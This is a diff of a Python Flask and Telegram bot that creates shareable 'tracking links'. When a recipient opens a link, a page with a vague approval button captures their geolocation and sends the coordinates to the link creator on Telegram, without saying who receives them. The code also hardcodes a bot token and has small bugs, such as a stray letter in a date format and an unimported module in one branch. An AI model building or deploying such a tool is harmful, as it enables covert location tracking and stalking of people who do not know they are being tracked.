@@ -1,22 +1,23 @@
 """
 بوت تتبع المواقع - Telegram Location Tracking Bot
-نسخة معدلة تعمل على Render
+نسخة مباشرة بدون threading
 البوت: @cccc00bot
 """
 
 from flask import Flask, request, jsonify, render_template_string
 import telebot
-import threading
 import logging
 import os
 import secrets
 import time
 from datetime import datetime, timedelta
+import sys
 
 # ========== إعدادات Logging محسنة ==========
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    stream=sys.stdout  # تأكد من ظهور الـ Logs في Render
 )
 logger = logging.getLogger(__name__)
 
@@ -24,22 +25,39 @@ app = Flask(__name__)
 
 # ========== إعدادات البوت ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')
 
 # ========== تخزين البيانات ==========
 tracking_links = {}
 user_data = {}
 
 # ========== متغيرات التتبع ==========
-bot_start_time = None
-bot_running = False
+bot_start_time = datetime.now()
+bot_connected = False
+
+# ========== محاولة الاتصال بالبوت ==========
+def connect_bot():
+    """محاولة الاتصال بـ Telegram API"""
+    global bot_connected
+    try:
+        logger.info("🔍 محاولة الاتصال بـ Telegram API...")
+        bot_info = bot.get_me()
+        bot_connected = True
+        logger.info(f"✅ الاتصال ناجح! البوت: @{bot_info.username}")
+        logger.info(f"🤖 اسم البوت: {bot_info.first_name}")
+        return True
+    except Exception as e:
+        bot_connected = False
+        logger.error(f"❌ فشل الاتصال: {e}")
+        return False
+
+# حاول الاتصال فوراً
+connect_bot()
 
 # ========== الصفحة الرئيسية ==========
 @app.route('/')
 def home():
     """الصفحة الرئيسية"""
-    bot_status = "🟢 يعمل" if bot_running else "🔴 متوقف"
-    
     return f'''
     <!DOCTYPE html>
     <html dir="rtl">
@@ -68,6 +86,19 @@ def home():
                 border-radius: 10px;
                 margin: 20px 0;
             }}
+            .btn {{
+                display: inline-block;
+                padding: 12px 24px;
+                background: #48bb78;
+                color: white;
+                text-decoration: none;
+                border-radius: 8px;
+                margin: 10px;
+                font-weight: bold;
+            }}
+            .btn:hover {{
+                background: #38a169;
+            }}
         </style>
     </head>
     <body>
@@ -76,13 +107,21 @@ def home():
             <div class="status">
                 <p>✅ الخدمة تعمل</p>
                 <p>🤖 البوت: @cccc00bot</p>
-                <p>📊 الحالة: {bot_status}</p>
+                <p>📊 الحالة: {'🟢 متصل' if bot_connected else '🔴 غير متصل'}</p>
                 <p>🔗 الروابط النشطة: {len(tracking_links)}</p>
                 <p>👥 المستخدمين: {len(user_data)}</p>
+                <p>⏰ وقت البدء: {bot_start_time.strftime("%Y/%m/%d %I:%M %p")}</p>
             </div>
             <div>
-                <a href="/health" style="color: #4CAF50; font-weight: bold; margin: 10px;">فحص الصحة</a>
-                <a href="/bot_status" style="color: #2196F3; font-weight: bold; margin: 10px;">حالة البوت</a>
+                <a href="/health" class="btn">فحص الصحة</a>
+                <a href="/reconnect" class="btn">إعادة الاتصال</a>
+                <a href="/test_bot" class="btn">اختبار البوت</a>
+            </div>
+            <div style="margin-top: 30px;">
+                <p>🚀 <strong>للاستخدام:</strong></p>
+                <p>1. افتح Telegram</p>
+                <p>2. ابحث عن @cccc00bot</p>
+                <p>3. أرسل /start</p>
             </div>
         </div>
     </body>
@@ -96,29 +135,56 @@ def health():
         'status': 'healthy',
         'service': 'telegram-tracking-bot',
         'bot': '@cccc00bot',
-        'bot_running': bot_running,
-        'bot_start_time': str(bot_start_time),
+        'bot_connected': bot_connected,
+        'bot_start_time': bot_start_time.isoformat(),
         'active_links': len(tracking_links),
         'total_users': len(user_data),
         'timestamp': datetime.now().isoformat()
     })
 
-@app.route('/bot_status')
-def bot_status():
-    """حالة البوت"""
-    return jsonify({
-        'bot_running': bot_running,
-        'bot_start_time': str(bot_start_time),
-        'bot_username': 'cccc00bot',
-        'current_time': datetime.now().isoformat()
-    })
+@app.route('/reconnect')
+def reconnect():
+    """إعادة الاتصال بالبوت"""
+    success = connect_bot()
+    if success:
+        return jsonify({
+            'success': True,
+            'message': 'تم الاتصال بالبوت بنجاح',
+            'bot': '@cccc00bot'
+        })
+    else:
+        return jsonify({
+            'success': False,
+            'error': 'فشل الاتصال بالبوت'
+        }), 500
+
+@app.route('/test_bot')
+def test_bot():
+    """اختبار البوت"""
+    try:
+        bot_info = bot.get_me()
+        return jsonify({
+            'success': True,
+            'bot': {
+                'username': bot_info.username,
+                'first_name': bot_info.first_name,
+                'id': bot_info.id
+            },
+            'connected': True,
+            'timestamp': datetime.now().isoformat()
+        })
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e),
+            'connected': False
+        }), 500
 
 # ========== معالجات البوت ==========
 @bot.message_handler(commands=['start', 'help'])
 def handle_start(message):
     """معالجة أمر /start"""
     try:
-        global user_data
         user_id = message.from_user.id
         username = message.from_user.username or "بدون"
         first_name = message.from_user.first_name or "مستخدم"
@@ -129,8 +195,8 @@ def handle_start(message):
         user_data[user_id] = {
             'name': first_name,
             'username': username,
-            'first_seen': datetime.now().isoformat(),
-            'last_active': datetime.now().isoformat()
+            'first_seen': datetime.now(),
+            'last_active': datetime.now()
         }
         
         response = f"""
@@ -147,15 +213,10 @@ def handle_start(message):
 ❓ `/help` - المساعدة
 🔧 `/status` - حالة البوت
 
-🔒 **مميزات البوت:**
-• روابط تنتهي بعد 24 ساعة
-• إشعارات فورية عند تحديد الموقع
-• حماية خصوصية كاملة
-
 💡 **ابدأ الآن:** أرسل `/newlink`
         """
         
-        bot.reply_to(message, response, parse_mode='Markdown')
+        bot.reply_to(message, response)
         logger.info(f"✅ تم الرد على {username}")
         
     except Exception as e:
@@ -175,8 +236,8 @@ def handle_newlink(message):
         tracking_links[tracking_id] = {
             'chat_id': chat_id,
             'user_id': user_id,
-            'created_at': datetime.now().isoformat(),
-            'expires_at': (datetime.now() + timedelta(hours=24)).isoformat(),
+            'created_at': datetime.now(),
+            'expires_at': datetime.now() + timedelta(hours=24),
             'active': True,
             'visits': 0,
             'successful_tracks': 0
@@ -184,7 +245,7 @@ def handle_newlink(message):
         
         # تحديث بيانات المستخدم
         if user_id in user_data:
-            user_data[user_id]['last_active'] = datetime.now().isoformat()
+            user_data[user_id]['last_active'] = datetime.now()
         
         # إنشاء الرابط
         tracking_url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{tracking_id}'
@@ -203,56 +264,13 @@ def handle_newlink(message):
 1. شارك هذا الرابط مع الشخص المطلوب
 2. عند فتح الرابط، سيطلب الإذن للوصول للموقع
 3. سيصلك إشعار فوري عند تحديد الموقع
-
-⚠️ **ملاحظة:** الرابط ينتهي تلقائياً بعد 24 ساعة
         """
         
-        bot.reply_to(message, response, parse_mode='Markdown')
-        logger.info(f"📝 تم إنشاء رابط: {tracking_id} لـ {user_id}")
+        bot.reply_to(message, response)
+        logger.info(f"📝 تم إنشاء رابط: {tracking_id}")
         
     except Exception as e:
         logger.error(f"❌ خطأ في newlink: {e}")
-        bot.reply_to(message, "❌ حدث خطأ في إنشاء الرابط. حاول مرة أخرى.")
-
-@bot.message_handler(commands=['mylinks'])
-def handle_mylinks(message):
-    """عرض روابط المستخدم"""
-    try:
-        user_id = message.from_user.id
-        
-        # البحث عن روابط المستخدم
-        user_links = []
-        for track_id, info in tracking_links.items():
-            if info['user_id'] == user_id and info['active']:
-                expires_at = datetime.fromisoformat(info['expires_at'])
-                if datetime.now() < expires_at:
-                    hours_left = (expires_at - datetime.now()).total_seconds() / 3600
-                    user_links.append({
-                        'id': track_id,
-                        'hours_left': int(hours_left),
-                        'visits': info.get('visits', 0),
-                        'tracks': info.get('successful_tracks', 0)
-                    })
-        
-        if not user_links:
-            bot.reply_to(message, "📭 **لا توجد روابط نشطة حالياً**\n\nاستخدم `/newlink` لإنشاء رابط جديد.", parse_mode='Markdown')
-            return
-        
-        response = "🔗 **روابطك النشطة:**\n\n"
-        for i, link in enumerate(user_links, 1):
-            url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{link["id"]}'
-            response += f"{i}. **الكود:** `{link['id'][:8]}...`\n"
-            response += f"   ⏰ **متبقي:** {link['hours_left']} ساعة\n"
-            response += f"   👁️ **الزيارات:** {link['visits']}\n"
-            response += f"   📍 **التتبعات:** {link['tracks']}\n\n"
-        
-        response += f"📊 **الإجمالي:** {len(user_links)} رابط نشط"
-        
-        bot.reply_to(message, response, parse_mode='Markdown')
-        
-    except Exception as e:
-        logger.error(f"❌ خطأ في mylinks: {e}")
-        bot.reply_to(message, "❌ حدث خطأ في عرض الروابط.")
 
 @bot.message_handler(commands=['status'])
 def handle_status(message):
@@ -262,78 +280,197 @@ def handle_status(message):
 🟢 **حالة النظام:**
 
 🤖 **البوت:** @cccc00bot
-🌐 **الحالة:** {'يعمل ✅' if bot_running else 'متوقف ❌'}
-⏰ **وقت التشغيل:** {str(bot_start_time) if bot_start_time else 'غير معروف'}
+🌐 **الحالة:** {'🟢 متصل' if bot_connected else '🔴 غير متصل'}
+⏰ **وقت التشغيل:** {bot_start_time.strftime('%Y/%m/%د %I:%M:%S %p')}
 🔗 **الروابط النشطة:** {len(tracking_links)}
 👥 **المستخدمين:** {len(user_data)}
 
 🕒 **الوقت الحالي:** {datetime.now().strftime('%Y/%m/%d %I:%M:%S %p')}
-
-🔧 **روابط التحكم:**
-• [فحص الصحة](https://telegram-tracking-bot-nkgz.onrender.com/health)
-• [الصفحة الرئيسية](https://telegram-tracking-bot-nkgz.onrender.com)
         """
         
-        bot.reply_to(message, status_text, parse_mode='Markdown')
+        bot.reply_to(message, status_text)
         
     except Exception as e:
         logger.error(f"❌ خطأ في status: {e}")
 
-# ========== تشغيل البوت ==========
-def run_bot():
-    """تشغيل البوت مع إعادة محاولة ذكية"""
-    global bot_running, bot_start_time
+# ========== صفحة التتبع ==========
+@app.route('/track/<tracking_id>')
+def track_page(tracking_id):
+    """صفحة طلب الموقع"""
+    if tracking_id in tracking_links:
+        link_info = tracking_links[tracking_id]
+        
+        # التحقق من الصلاحية
+        if datetime.now() > link_info['expires_at']:
+            link_info['active'] = False
+            return '''
+            <!DOCTYPE html>
+            <html dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <title>انتهت الصلاحية</title>
+                <style>
+                    body { font-family: Arial; text-align: center; padding: 50px; }
+                </style>
+            </head>
+            <body>
+                <h1>⏰ انتهت صلاحية الرابط</h1>
+                <p>رابط التتبع هذا لم يعد فعالاً</p>
+            </body>
+            </html>
+            '''
+        
+        # زيادة الزيارات
+        link_info['visits'] += 1
+        
+        return '''
+        <!DOCTYPE html>
+        <html dir="rtl">
+        <head>
+            <meta charset="UTF-8">
+            <title>طلب الموقع</title>
+            <style>
+                body { font-family: Arial; text-align: center; padding: 50px; }
+                .btn { background: #48bb78; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
+            </style>
+        </head>
+        <body>
+            <h1>📍 طلب الوصول إلى الموقع</h1>
+            <button class="btn" onclick="getLocation()">✅ موافق ومتابعة</button>
+            <script>
+                function getLocation() {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            function(position) {
+                                const data = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    timestamp: new Date().toISOString(),
+                                    tracking_id: "''' + tracking_id + '''"
+                                };
+                                
+                                fetch('/track', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify(data)
+                                }).then(() => {
+                                    document.body.innerHTML = "<h1>✅ تم بنجاح</h1>";
+                                });
+                            },
+                            function(error) {
+                                alert("فشل: " + error.message);
+                            }
+                        );
+                    } else {
+                        alert("المتصفح لا يدعم الموقع");
+                    }
+                }
+            </script>
+        </body>
+        </html>
+        '''
     
-    logger.info("🚀 محاولة تشغيل البوت...")
-    
-    while True:
-        try:
-            # اختبار الاتصال
-            logger.info("🔍 اختبار الاتصال بـ Telegram API...")
-            bot_info = bot.get_me()
-            logger.info(f"✅ الاتصال ناجح! البوت: @{bot_info.username}")
+    return "رابط غير صالح", 404
+
+@app.route('/track', methods=['POST'])
+def handle_track():
+    """معالجة بيانات الموقع"""
+    try:
+        data = request.get_json()
+        tracking_id = data.get('tracking_id')
+        
+        if tracking_id in tracking_links:
+            link_info = tracking_links[tracking_id]
+            chat_id = link_info['chat_id']
+            lat = data.get('latitude')
+            lon = data.get('longitude')
             
-            bot_running = True
-            bot_start_time = datetime.now()
+            # إرسال الموقع
+            try:
+                bot.send_message(
+                    chat_id,
+                    f"""📍 **موقع جديد!**
+
+الإحداثيات: `{lat}`, `{lon}`
+الخريطة: https://maps.google.com/?q={lat},{lon}"""
+                )
+                
+                # تحديث الإحصائيات
+                link_info['successful_tracks'] += 1
+                
+                return jsonify({'success': True})
+                
+            except Exception as e:
+                logger.error(f"❌ خطأ في إرسال للبوت: {e}")
+                return jsonify({'error': 'فشل في إرسال للبوت'}), 500
+            
+        return jsonify({'error': 'رابط غير صالح'}), 400
+        
+    except Exception as e:
+        logger.error(f"❌ خطأ في معالجة التتبع: {e}")
+        return jsonify({'error': str(e)}), 500
+
+# ========== بدء Polling في خلفية ==========
+def start_polling():
+    """بدء Polling في خلفية"""
+    logger.info("🚀 بدء Polling للبوت...")
+    
+    max_retries = 5
+    retry_delay = 10  # ثواني
+    
+    for attempt in range(max_retries):
+        try:
+            logger.info(f"🔄 محاولة {attempt + 1}/{max_retries}...")
+            
+            # اختبار الاتصال أولاً
+            bot_info = bot.get_me()
+            logger.info(f"✅ البوت متصل: @{bot_info.username}")
             
             # بدء Polling
             logger.info("🎯 بدء استقبال الرسائل...")
-            bot.infinity_polling(timeout=60, long_polling_timeout=60, logger_level=logging.INFO)
+            bot.polling(none_stop=True, timeout=30, long_polling_timeout=30)
             
             # إذا وصلنا هنا، فقد توقف Polling
-            logger.warning("⚠️ توقف Polling، إعادة المحاولة...")
-            bot_running = False
+            logger.warning("⚠️ توقف Polling")
+            break
             
         except Exception as e:
-            bot_running = False
-            logger.error(f"❌ خطأ في البوت: {e}")
-            logger.info("⏳ إعادة المحاولة بعد 10 ثواني...")
-            time.sleep(10)
+            logger.error(f"❌ خطأ في Polling (المحاولة {attempt + 1}): {e}")
+            
+            if attempt < max_retries - 1:
+                logger.info(f"⏳ الانتظار {retry_delay} ثانية للمحاولة التالية...")
+                time.sleep(retry_delay)
+                retry_delay *= 2  # زيادة وقت الانتظار
+            else:
+                logger.error("❌ فشلت جميع محاولات Polling")
 
 # ========== بدء التشغيل ==========
 if __name__ == '__main__':
-    # بدء البوت في خيط منفصل
-    logger.info("🔧 بدء إعداد النظام...")
+    # تسجيل بدء التشغيل
+    logger.info("=" * 50)
+    logger.info("🚀 بدء تشغيل نظام التتبع...")
+    logger.info(f"🤖 البوت: @cccc00bot")
+    logger.info("=" * 50)
     
-    # تأخير بسيط لضمان تحميل كل شيء
-    time.sleep(2)
-    
-    # تشغيل البوت
-    bot_thread = threading.Thread(target=run_bot, daemon=True, name="BotThread")
-    bot_thread.start()
-    
-    logger.info("✅ خيط البوت بدأ التشغيل")
+    # محاولة الاتصال بالبوت
+    if connect_bot():
+        # بدء Polling في خلفية
+        import threading
+        polling_thread = threading.Thread(target=start_polling, daemon=True)
+        polling_thread.start()
+        logger.info("✅ بدأ خيط Polling في الخلفية")
+    else:
+        logger.error("❌ فشل الاتصال بالبوت، سيحاول خيط Polling الاتصال تلقائياً")
+        # بدء Polling مع محاولات الاتصال
+        polling_thread = threading.Thread(target=start_polling, daemon=True)
+        polling_thread.start()
     
     # تشغيل خادم Flask
     port = int(os.environ.get('PORT', 10000))
     logger.info(f"🌐 بدء خادم Flask على المنفذ {port}")
-    
-    # إرسال رسالة بدء التشغيل
-    time.sleep(3)
     logger.info("=" * 50)
-    logger.info("✅ النظام جاهز للعمل!")
-    logger.info("🤖 البوت: @cccc00bot")
-    logger.info(f"🌐 الخادم: http://0.0.0.0:{port}")
+    logger.info("✅ النظام جاهز!")
     logger.info("=" * 50)
     
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
